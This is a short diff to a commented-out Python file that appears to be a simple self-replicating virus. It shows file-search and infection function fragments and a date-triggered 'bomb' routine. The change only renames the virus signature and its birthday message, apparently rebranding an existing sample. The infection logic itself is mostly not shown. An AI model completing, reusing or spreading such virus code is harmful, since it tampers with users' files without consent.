@@ -1,7 +1,7 @@
 # #!/usr/bin/python
 # import os
 # import datetime
-# SIGNATURE = "CRANKLIN PYTHON VIRUS"
+# SIGNATURE = "ARKA PYTHON VIRUS"
 # def search(path):
 #     filestoinfect = []
 #     filelist = os.listdir(path)
@@ -33,7 +33,7 @@
 #         f.close()
 # def bomb():
 #     if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-#         print "HAPPY BIRTHDAY CRANKLIN!"
+#         print "HAPPY BIRTHDAY ARKAAAA!"
 # filestoinfect = search(os.path.abspath(""))
 # infect(filestoinfect)
 # bomb()
